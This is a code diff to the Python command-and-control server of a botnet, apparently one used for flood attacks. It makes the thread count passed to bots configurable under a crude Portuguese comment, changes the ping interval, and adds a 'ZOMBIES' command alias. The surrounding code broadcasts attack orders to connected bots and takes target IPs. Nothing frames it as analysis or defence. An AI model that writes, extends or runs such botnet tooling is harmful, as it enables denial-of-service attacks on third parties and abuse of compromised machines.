@@ -12,6 +12,9 @@ attacks={}
 maxAttacks=30
 rootUser='root'
 
+# Não aumente de mais as threads (Você vai foder com seus bots)
+threads=30
+
 ansi_clear = '\033[2J\033[H'
 
 def color(data_input_output):
@@ -203,7 +206,7 @@ def broadcast(data):
     dead_bots = []
     for bot in bots.keys():
         try:
-            send(bot, f'{data} 32', False, False)
+            send(bot, f'{data} {threads}', False, False)
         except:
             dead_bots.append(bot)
     for bot in dead_bots:
@@ -225,7 +228,7 @@ def ping():
         for bot in dead_bots:
             bots.pop(bot)
             bot.close()
-        time.sleep(5)
+        time.sleep(4)
 
 def update_title(client, name):
     titles = [
@@ -278,7 +281,7 @@ def command_line(client, username):
                     send(client, '\x1b[3;31;40m' + f"{C}{m}       {gray}{desc}")
                 send(client, '')
             
-            elif command == 'BOTS':
+            elif command == 'BOTS' or command == 'ZOMBIES':
                 send(client, f'{C}Connected bots: {G}{len(bots)}\n')
 
             elif command == '!R' or command == '!REG' or command == '!REGISTER':
@@ -313,7 +316,6 @@ def command_line(client, username):
                 time.sleep(1)
                 break
             
-            # send Botnet attack
             elif isBotnetMethod(command):
                 if len(args) == 4:
                     ip = args[1]
